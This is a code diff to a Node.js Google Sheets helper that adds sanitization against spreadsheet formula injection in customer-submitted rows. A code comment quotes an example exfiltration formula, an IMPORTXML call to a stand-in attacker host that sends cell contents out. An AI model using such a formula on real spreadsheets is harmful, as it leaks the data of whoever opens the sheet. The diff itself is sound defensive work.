@@ -2,6 +2,17 @@ const { getAccessToken } = require('./google-auth')
 
 const SHEETS_SCOPE = 'https://www.googleapis.com/auth/spreadsheets'
 
+// USER_ENTERED makes Sheets parse leading =/+/-/@ as a live formula. Row data here is
+// customer-submitted (job-request/lead forms), so without this a description like
+// =IMPORTXML("https://evil.example/leak?x="&A1,"//a") would execute the moment the
+// sheet is opened. Prefixing with an apostrophe forces literal-text, the standard
+// mitigation for CSV/spreadsheet formula injection — only applied to strings so real
+// numeric values (e.g. ai_estimate_low) keep their native Sheets number type.
+function sanitizeSheetValue(value) {
+  if (typeof value !== 'string') return value
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
+}
+
 function columnLetter(index) {
   let letter = ''
   let n = index + 1
@@ -27,7 +38,7 @@ async function appendRow(sheetId, tab, headers, rowObject) {
       },
       body: JSON.stringify({
         majorDimension: 'ROWS',
-        values: [headers.map(header => rowObject[header] ?? '')]
+        values: [headers.map(header => sanitizeSheetValue(rowObject[header] ?? ''))]
       })
     }
   )
@@ -81,7 +92,7 @@ async function updateRowCells(sheetId, tab, rowNumber, headers, updates) {
       const colIndex = headers.indexOf(header)
       if (colIndex === -1) return null
       const range = `'${tab.replace(/'/g, "''")}'!${columnLetter(colIndex)}${rowNumber}`
-      return { range, values: [[value]] }
+      return { range, values: [[sanitizeSheetValue(value)]] }
     })
     .filter(Boolean)
 
